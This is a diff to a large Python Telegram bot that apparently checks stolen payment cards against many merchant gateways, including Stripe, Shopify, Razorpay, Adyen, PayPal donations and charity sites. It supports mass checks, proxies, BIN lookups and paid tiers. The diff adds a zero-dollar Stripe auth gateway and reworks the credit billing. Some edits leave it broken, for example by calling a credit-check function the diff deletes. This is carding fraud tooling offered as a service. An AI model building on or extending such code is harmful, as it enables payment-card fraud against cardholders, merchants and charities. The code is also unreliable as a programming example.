@@ -4221,14 +4221,8 @@ async def single_check_auto_stripe(update: Update, context: ContextTypes.DEFAULT
         user_manager.increment_checks(user_id)
         
         # Show remaining credits for free users
-        tier_check = user_manager.get_tier(user_id)
-        if tier_check == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
+            
         
     except Exception as e:
         print(f"❌ [AUTO STRIPE DEBUG] Error: {e}")
@@ -8790,6 +8784,10 @@ class GatewayManager:
             
             # ST1
             "st1": {"enabled": True, "name": "ST1 Auth", "emoji": "🔐"},
+            
+            "stripe_auth0": {"enabled": True, "name": "Stripe Auth 0$", "emoji": "🔓"},
+            "chk0": {"enabled": True, "name": "Stripe Auth 0$", "emoji": "🔓"},
+            "mchk0": {"enabled": True, "name": "Stripe Auth 0$ Mass", "emoji": "🔓"},
         }
         self.load_status()
     
@@ -12388,7 +12386,6 @@ def format_st1_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, 
         f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
         f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
         f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
-        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
     )
     
     return ui, status_category
@@ -12503,14 +12500,7 @@ async def single_check_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -13193,7 +13183,7 @@ async def single_check_stripe_auth_v2(update: Update, context: ContextTypes.DEFA
         return
     
     checking_msg = await message.reply_text(
-        f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking card with Stripe Auth...",
+        f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking...",
         parse_mode=ParseMode.HTML
     )
     
@@ -13252,14 +13242,7 @@ async def single_check_stripe_auth_v2(update: Update, context: ContextTypes.DEFA
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         try:
@@ -13584,8 +13567,9 @@ async def mass_check_stripe_auth_v2(update: Update, context: ContextTypes.DEFAUL
         
 # ============ CREDIT SYSTEM (FREE USERS ONLY) ============
 CREDITS_FILE = "user_credits.json"
-INITIAL_FREE_CREDITS = 250
-CREDITS_PER_CHECK = 1  # 1 credit = 1 card check (only for free users)
+INITIAL_FREE_CREDITS = 150  # New users get 250 free credits
+CREDITS_PER_SINGLE_CHECK = 1  # 1 credit = 1 single card check
+CREDITS_PER_MASS_CHECK = 1000000  # 1 credit per card in mass check
 
 # Store user credits
 user_credits = {}  # user_id -> credits remaining
@@ -13608,6 +13592,7 @@ def load_user_credits():
         user_credits = {}
     user_credits_loaded = True
 
+
 def save_user_credits():
     """Save user credits to file"""
     try:
@@ -13616,11 +13601,13 @@ def save_user_credits():
     except Exception as e:
         print(f"⚠️ Error saving credits: {e}")
 
+
 def get_user_credits(user_id: int) -> int:
     """Get remaining credits for a user"""
     if not user_credits_loaded:
         load_user_credits()
     return user_credits.get(user_id, 0)
+
 
 def add_user_credits(user_id: int, amount: int) -> int:
     """Add credits to a user and return new total"""
@@ -13630,14 +13617,19 @@ def add_user_credits(user_id: int, amount: int) -> int:
     save_user_credits()
     return new_total
 
-def deduct_user_credits(user_id: int, amount: int = CREDITS_PER_CHECK) -> bool:
-    """Deduct credits for a check, return True if successful"""
+
+def deduct_user_credits(user_id: int, amount: int = CREDITS_PER_SINGLE_CHECK) -> bool:
+    """
+    Deduct credits for a check
+    Returns: True if successful, False if insufficient credits
+    """
     current = get_user_credits(user_id)
     if current >= amount:
         user_credits[user_id] = current - amount
         save_user_credits()
         return True
     return False
+
 
 def initialize_new_user_credits(user_id: int) -> int:
     """Give initial free credits to new user (only for free tier)"""
@@ -13649,11 +13641,13 @@ def initialize_new_user_credits(user_id: int) -> int:
         return INITIAL_FREE_CREDITS
     return user_credits[user_id]
 
+
 def reset_user_credits(user_id: int) -> bool:
     """Reset user credits to initial amount (admin only)"""
     user_credits[user_id] = INITIAL_FREE_CREDITS
     save_user_credits()
     return True
+
 
 # Load credits on startup
 load_user_credits()
@@ -15150,6 +15144,24 @@ async def auto_detect_reply_with_command(update: Update, context: ContextTypes.D
 
 # ============ USER MANAGEMENT SYSTEM (UPDATED WITH CREDITS) ============
 
+def can_access_gateway(self, user_id: int, gateway: str) -> bool:
+    """Check if user can access a specific gateway"""
+    tier = self.get_tier(user_id)
+    
+    # Admin/Owner has access to all gateways
+    if user_id == OWNER_ID:
+        return True
+    
+    # If user is FREE, check if they have credits first
+    if tier == 'free':
+        credits = get_user_credits(user_id)
+        if credits <= 0:
+            return False
+    
+    # Check if gateway is in user's tier allowed gateways
+    return gateway in self.TIERS[tier]["can_access_gateways"]
+
+
 class UserManager:
     """Complete user management system with improved tiers and worker mode"""
     
@@ -15160,7 +15172,7 @@ class UserManager:
         "can_use_proxy": True,
         "can_access_gateways": [
             
-            
+            "shopify", "razorpay", "stripe_auth0",
             # <-- ADD THIS LINE
             # Add other gateways you want free users to access
         ],
@@ -15200,7 +15212,7 @@ class UserManager:
             "max_batch_size": 20000,
             "can_use_proxy": True,
             "can_access_gateways": [
-                "shopify", "auto_stripe", "adyen_direct", "paypal", "stripe_charge_v2","adyen","stripe_pl",
+                "shopify", "auto_stripe", "adyen_direct", "paypal", "stripe_charge_v2","adyen","stripe_pl","stripe_auth0",
                 "b3charged", "razorpay", "stripe_charge", "stripe_auth","paypal_donation",
                 "dork", "braintree", "autosopi", "payflow"
             ],
@@ -15220,7 +15232,7 @@ class UserManager:
             "max_batch_size": 1000000,
             "can_use_proxy": True,
             "can_access_gateways": [
-                "paypal", "shopify", "adyen_direct", "auto_stripe","stripe_charge_v2", "adyen","stripe_pl",
+                "paypal", "shopify", "adyen_direct", "auto_stripe","stripe_charge_v2", "adyen","stripe_pl","stripe_auth0",
                 "b3charged", "razorpay", "stripe_charge", "stripe_auth", "paypal_donation",
                 "braintree", "autosopi", "payflow"
             ],
@@ -15439,7 +15451,7 @@ class UserManager:
         credits = get_user_credits(user_id)
         return credits >= required
     
-    def use_credit(self, user_id: int, amount: int = CREDITS_PER_CHECK) -> bool:
+    def use_credit(self, user_id: int, amount: int =  CREDITS_PER_SINGLE_CHECK) -> bool:
         """
         Use credits for a check (only for free users)
         Returns: True if successful, False if not enough credits
@@ -15536,8 +15548,8 @@ class UserManager:
             "credits": credits,
             "used": used,
             "remaining": credits,
-            "cost_per_check": CREDITS_PER_CHECK,
-            "estimated_checks": credits // CREDITS_PER_CHECK
+            "cost_per_check": CREDITS_PER_SINGLE_CHECK,
+            "estimated_checks": credits // CREDITS_PER_SINGLE_CHECK
         }
     
     def get_user_stats(self, user_id: int) -> dict:
@@ -18556,14 +18568,7 @@ async def single_check_ezycourse(update: Update, context: ContextTypes.DEFAULT_T
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -19371,7 +19376,6 @@ def format_adyen_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str
         f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
         f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
         f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
-        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
     )
     
     return ui, status_category
@@ -19482,13 +19486,7 @@ async def single_check_adyen(update: Update, context: ContextTypes.DEFAULT_TYPE)
         
         user_manager.increment_checks(user_id)
         
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -20467,7 +20465,6 @@ def format_stripe_pl_response(result: Dict, card: str, bin_info: tuple) -> Tuple
         f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
         f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
         f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
-        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
     )
     
     return ui, status_category
@@ -20580,13 +20577,7 @@ async def single_check_stripe_pl(update: Update, context: ContextTypes.DEFAULT_T
         
         user_manager.increment_checks(user_id)
         
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -22713,14 +22704,7 @@ async def single_check_paypal_donation_50(update: Update, context: ContextTypes.
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -23653,7 +23637,6 @@ def format_paypal_donation_response(result: Dict, card: str, bin_info: tuple) ->
         f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
         f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
         f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣  {country_name}\n"
-        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
     )
     
     return ui, status_category
@@ -23763,13 +23746,7 @@ async def single_check_paypal_donation(update: Update, context: ContextTypes.DEF
         
         user_manager.increment_checks(user_id)
         
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -28676,85 +28653,6 @@ async def key_expiry_worker(context: ContextTypes.DEFAULT_TYPE):
     user_manager.save_users()
 
 
-# ============ ACCESS CONTROL FUNCTIONS ============
-
-async def check_and_deduct_credits(user_id: int, update: Update, context: ContextTypes.DEFAULT_TYPE, is_mass_check: bool = False, card_count: int = 1) -> Tuple[bool, str]:
-    """
-    Check if user has enough credits and deduct if they are free tier.
-    FREE USERS: 1 credit = 1 card check
-    PAID USERS: Unlimited access
-    
-    Returns: (success, error_message)
-    """
-    tier = user_manager.get_tier(user_id)
-    chat = update.effective_chat
-    
-    # Debug print
-    print(f"🔍 [CREDIT CHECK] User: {user_id}, Tier: {tier}, Chat type: {chat.type}, Is mass: {is_mass_check}, Card count: {card_count}")
-    
-    # Admin/Owner has unlimited access
-    if user_id == OWNER_ID:
-        print(f"✅ [CREDIT CHECK] Owner - unlimited access")
-        return True, None
-    
-    # Paid users have unlimited access
-    if tier in ['premium', 'ultimate', 'admin']:
-        print(f"✅ [CREDIT CHECK] Paid user - unlimited access")
-        return True, None
-    
-    # Free in group chats - SINGLE checks are FREE (no credit deduction)
-    if chat.type in ['group', 'supergroup'] and not is_mass_check:
-        print(f"✅ [CREDIT CHECK] Free group chat single check - no credit deduction")
-        return True, None
-    
-    # Free user - check credits
-    if tier == 'free':
-        credits = get_user_credits(user_id)
-        print(f"📊 [CREDIT CHECK] Free user {user_id} has {credits} credits")
-        
-        # Initialize credits for new users (250 free credits)
-        if credits == 0 and user_id not in user_credits:
-            credits = initialize_new_user_credits(user_id)
-            print(f"🎉 New free user {user_id} initialized with {credits} free credits")
-        
-        # Calculate required credits
-        required = card_count if is_mass_check else CREDITS_PER_CHECK
-        
-        print(f"📊 [CREDIT CHECK] Required credits: {required}")
-        
-        # Check if enough credits
-        if credits < required:
-            error_msg = (
-                f"❌ <b>Insufficient Credits!</b>\n\n"
-                f"🎯 Your balance: <b>{credits}</b> credits\n"
-                f"💸 Cost for this check: <b>{required}</b> credit(s)\n"
-                f"━━━━━━━━━━━━━━━━━━━\n\n"
-                f"💎 <b>Ways to get more credits:</b>\n"
-                f"├─ Use in group chats (FREE! No credits used)\n"
-                f"├─ Redeem a credit key: /redeemcredits &lt;key&gt;\n"
-                f"├─ Upgrade to Premium/Ultimate\n"
-                f"└─ Contact @lencax\n\n"
-                f"📝 <b>Commands:</b>\n"
-                f"├─ /credits - Check balance\n"
-                f"├─ /redeemcredits - Add credits\n"
-                f"└─ /price - Upgrade\n\n"
-                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
-            )
-            print(f"❌ [CREDIT CHECK] Insufficient credits! User {user_id} has {credits}, needs {required}")
-            return False, error_msg
-        
-        # Deduct credits
-        if deduct_user_credits(user_id, required):
-            new_credits = get_user_credits(user_id)
-            print(f"💎 [CREDIT CHECK] User {user_id} used {required} credit(s). Remaining: {new_credits}")
-            return True, None
-        else:
-            print(f"❌ [CREDIT CHECK] Failed to deduct credits for user {user_id}")
-            return False, "❌ Failed to deduct credits. Please try again."
-    
-    return True, None
-
-
 # ============ PAYPAL MASS CHECK LOGIC ============
 
 async def paypal_single_check_with_gif(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
@@ -28911,15 +28809,7 @@ async def paypal_single_check_with_gif(update: Update, context: ContextTypes.DEF
         
         user_manager.increment_checks(u_id)
         
-        # Show remaining credits for free users
-        tier_check = user_manager.get_tier(u_id)
-        if tier_check == 'free':
-            remaining = get_user_credits(u_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -29801,14 +29691,7 @@ async def single_check_braintree_auth(update: Update, context: ContextTypes.DEFA
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -30736,7 +30619,6 @@ def format_shopify_single_response(result: Dict, card: str, bin_info: tuple) -> 
         f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
         f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
         f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
-        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
     )
     
     return ui, status_category
@@ -30753,24 +30635,24 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
     message = update.effective_message
     username = update.effective_user.username or update.effective_user.first_name
     
-    # Initialize checking_msg as None at the start
-    checking_msg = None
-    
-    # Check credits
+    # ============ FIX: Check credits FIRST (again, as a safety net) ============
     can_proceed, error_msg = await check_and_deduct_credits(u_id, update, context, is_mass_check=False, card_count=1)
     if not can_proceed:
         await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
         return
     
+    # Initialize checking_msg as None at the start
+    checking_msg = None
+    
     # Check gateway access
-    if not user_manager.can_access_gateway(u_id, 'autosopi'):
+    if not user_manager.can_access_gateway(u_id, 'shopify'):
         tier = user_manager.get_tier(u_id)
-        # FIXED: Combine all text into a single string
         error_message = (
-            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
-            
+            f"❌ <b>Shopify not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
         )
         await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        # Refund credits since gateway not available
         add_user_credits(u_id, 1)
         return
     
@@ -30863,7 +30745,6 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
             f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
             f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
             f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
-            f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
         )
         
         # Delete checking message and send result
@@ -30902,6 +30783,8 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
         
         user_manager.increment_checks(u_id)
         
+       
+        
     except Exception as e:
         # SAFE: Only try to delete/update checking_msg if it was created
         if checking_msg:
@@ -30911,6 +30794,7 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
                 pass
         await message.reply_text(f"❌ Error: {str(e)[:100]}")
         print(f"❌ [Shopify Pool] Error: {traceback.format_exc()}")
+        # Refund credits on error
         add_user_credits(u_id, 1)
     finally:
         if u_id in shopify_active_tasks:
@@ -31989,14 +31873,7 @@ async def single_check_sc1(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         print(f"❌ SC1 error: {e}")
@@ -32890,14 +32767,7 @@ async def single_check_razorpay2(update: Update, context: ContextTypes.DEFAULT_T
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         print(f"❌ Razorpay2 error: {e}")
@@ -34272,13 +34142,7 @@ async def single_check_razorpay_gate2(update: Update, context: ContextTypes.DEFA
         
         user_manager.increment_checks(user_id)
         
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+      
         
     except Exception as e:
         try:
@@ -35262,14 +35126,7 @@ async def single_check_stripe_4usd(update: Update, context: ContextTypes.DEFAULT
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         try:
@@ -36929,21 +36786,70 @@ async def single_check_razorpay(update: Update, context: ContextTypes.DEFAULT_TY
         )
         return
     
-    # Check credits
+    # ============ FIX: Check credits FIRST ============
     can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
     if not can_proceed:
         await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
         return
     
-    # Check gateway access
+    # ============ FIX: Check gateway access AFTER credits ============
+    # Only check gateway access if user has credits
     if not user_manager.can_access_gateway(user_id, 'razorpay'):
         tier = user_manager.get_tier(user_id)
-        await message.reply_text(
-            f" USE /buy TO UPGRADE YOUR TIER 💎\n"
-        )
-        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
-        add_user_credits(u_id, 1)
-        return
+        
+        # If user is FREE and has 0 credits, show upgrade message
+        credits = get_user_credits(user_id)
+        if tier == 'free' and credits <= 0:
+            error_message = (
+                f"❌ <b>Insufficient Credits!</b>\n\n"
+                f"🎯 Your balance: <b>0</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"💎 <b>Ways to get credits:</b>\n"
+                f"├─ Redeem a credit key: /redeemcredits &lt;key&gt;\n"
+                f"├─ Upgrade to Premium/Ultimate for unlimited\n"
+                f"└─ Contact @lencax\n\n"
+                f"📝 <b>Commands:</b>\n"
+                f"├─ /credits - Check balance\n"
+                f"├─ /redeemcredits - Add credits\n"
+                f"└─ /buy - Upgrade\n\n"
+                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+            # Refund credits since gateway not available
+            add_user_credits(user_id, 1)
+            return
+        
+        # If user is FREE but has credits, show available gateways
+        elif tier == 'free' and credits > 0:
+            error_message = (
+                f"❌ <b>Razorpay not available for FREE tier</b>\n\n"
+                f"🎯 Your balance: <b>{credits}</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"📌 <b>Available gateways for FREE tier:</b>\n"
+                f"   • /chk - Auto Stripe (Single check)\n"
+                f"   • /sh - Shopify (Single check)\n"
+                f"   • /pp - PayPal (Single check)\n\n"
+                f"💎 <b>Upgrade to Premium/Ultimate for:</b>\n"
+                f"   • Razorpay gateway\n"
+                f"   • Mass checks\n"
+                f"   • All gateways\n"
+                f"   • Unlimited credits\n\n"
+                f"Use <code>/buy</code> to see upgrade options."
+            )
+            await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+            # Refund credits since gateway not available
+            add_user_credits(user_id, 1)
+            return
+        
+        # Paid user trying to access gateway that's not available (shouldn't happen)
+        else:
+            error_message = (
+                f"❌ <b>Gateway not available</b>\n\n"
+                f"Contact @lencax for assistance."
+            )
+            await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+            add_user_credits(user_id, 1)
+            return
     
     razorpay_active_tasks[user_id] = True
     
@@ -36966,7 +36872,7 @@ async def single_check_razorpay(update: Update, context: ContextTypes.DEFAULT_TY
                 if proxy_list:
                     proxy_str = proxy_list[0]
         
-        # Use the pool to check the card - FIXED: Call the correct function
+        # Use the pool to check the card
         result = await check_card_razorpay_with_pool(card, proxy_str, user_id)
         
         elapsed = time.time() - start
@@ -37007,14 +36913,7 @@ async def single_check_razorpay(update: Update, context: ContextTypes.DEFAULT_TY
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         print(f"❌ Razorpay error: {e}")
@@ -37023,7 +36922,7 @@ async def single_check_razorpay(update: Update, context: ContextTypes.DEFAULT_TY
         except:
             pass
         await message.reply_text(f"❌ Error: {str(e)[:100]}")
-        add_user_credits(user_id, 1)
+        add_user_credits(user_id, 1)  # Refund credit on error
     finally:
         razorpay_active_tasks.pop(user_id, None)
         
@@ -37332,18 +37231,65 @@ async def mass_check_razorpay_command(update: Update, context: ContextTypes.DEFA
     user_id = update.effective_user.id
     message = update.effective_message
     
-    if not user_manager.can_access_gateway(user_id, 'razorpay'):
-        await message.reply_text("❌ Your tier doesn't have access to Razorpay gateway.")
-        return
-    
+    # ============ FIX: Check if user can mass check FIRST ============
     if not user_manager.can_mass_check(user_id):
         tier = user_manager.get_tier(user_id)
-        await message.reply_text(
-            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
-            f"Use /rz for single checks.\n"
-            f"💎 Upgrade to Premium/Ultimate for mass checks.",
-            parse_mode=ParseMode.HTML
+        credits = get_user_credits(user_id) if tier == 'free' else "∞"
+        
+        # If FREE user with 0 credits - show upgrade message
+        if tier == 'free' and credits <= 0:
+            error_message = (
+                f"❌ <b>Insufficient Credits!</b>\n\n"
+                f"🎯 Your balance: <b>0</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"💎 <b>Ways to get credits:</b>\n"
+                f"├─ Redeem a credit key: /redeemcredits &lt;key&gt;\n"
+                f"├─ Upgrade to Premium/Ultimate for unlimited\n"
+                f"└─ Contact @lencax\n\n"
+                f"📝 <b>Commands:</b>\n"
+                f"├─ /credits - Check balance\n"
+                f"├─ /redeemcredits - Add credits\n"
+                f"└─ /buy - Upgrade\n\n"
+                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+            return
+        
+        # If FREE user with credits - show upgrade message
+        elif tier == 'free' and credits > 0:
+            error_message = (
+                f"❌ <b>Mass Check Not Available for FREE Tier</b>\n\n"
+                f"🎯 Your balance: <b>{credits}</b> credits\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"📌 <b>FREE tier limitations:</b>\n"
+                f"   • Single checks only\n"
+                f"   • Use /rz for single card checks\n\n"
+                f"💎 <b>Upgrade to Premium/Ultimate for:</b>\n"
+                f"   • Mass checks\n"
+                f"   • All gateways\n"
+                f"   • Unlimited credits\n\n"
+                f"USE /buy TO UPGRADE YOUR TIER 💎"
+            )
+            await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+            return
+        
+        # Paid user trying mass check (shouldn't happen)
+        else:
+            error_message = (
+                f"❌ <b>Mass Check Not Available</b>\n\n"
+                f"Contact @lencax for assistance."
+            )
+            await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+            return
+    
+    # Continue with mass check logic...
+    if not user_manager.can_access_gateway(user_id, 'razorpay'):
+        tier = user_manager.get_tier(user_id)
+        error_message = (
+            f"❌ <b>Razorpay not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
         )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
         return
     
     # Check if reply to file
@@ -37371,7 +37317,7 @@ async def mass_check_razorpay_command(update: Update, context: ContextTypes.DEFA
             except:
                 pass
             
-            # ============ PASS progress_msg=None to let function create it ============
+            # ============ Pass progress_msg=None to let function create it ============
             await razorpay_mass_check_with_pool(update, context, cards, None)
             return
             
@@ -37418,7 +37364,7 @@ async def mass_check_razorpay_command(update: Update, context: ContextTypes.DEFA
     except:
         pass
     
-    # ============ PASS progress_msg=None to let function create it ============
+    # ============ Pass progress_msg=None to let function create it ============
     await razorpay_mass_check_with_pool(update, context, cards, None)
         
 
@@ -38331,14 +38277,7 @@ async def single_check_princess(update: Update, context: ContextTypes.DEFAULT_TY
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         try:
@@ -40147,14 +40086,7 @@ async def single_check_dabbagh(update: Update, context: ContextTypes.DEFAULT_TYP
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         try:
@@ -41086,14 +41018,7 @@ async def single_check_united_way(update: Update, context: ContextTypes.DEFAULT_
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+       
         
     except Exception as e:
         try:
@@ -45688,7 +45613,6 @@ def format_stripe_charge_v2_response(result: Dict, card: str, bin_info: tuple) -
         f"⌬ 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
         f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
         f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
-        f"⌬ 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
     )
     
     return ui, status_category
@@ -45728,7 +45652,7 @@ async def single_check_stripe_charge_v2(update: Update, context: ContextTypes.DE
         return
     
     checking_msg = await message.reply_text(
-            f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking Stripe Charge...",
+            f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking...",
             parse_mode=ParseMode.HTML
         )
     
@@ -45798,14 +45722,7 @@ async def single_check_stripe_charge_v2(update: Update, context: ContextTypes.DE
         
         user_manager.increment_checks(user_id)
         
-        # Show remaining credits for free users
-        if user_manager.get_tier(user_id) == 'free':
-            remaining = get_user_credits(user_id)
-            await message.reply_text(
-                f"💎 <b>Credits Remaining: {remaining}</b>\n"
-                f"Use /credits to check balance.",
-                parse_mode=ParseMode.HTML
-            )
+        
         
     except Exception as e:
         try:
@@ -47831,6 +47748,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         
         '/sc': 'dabbagh_stripe',
         '/msc': 'dabbagh_stripe',
+        
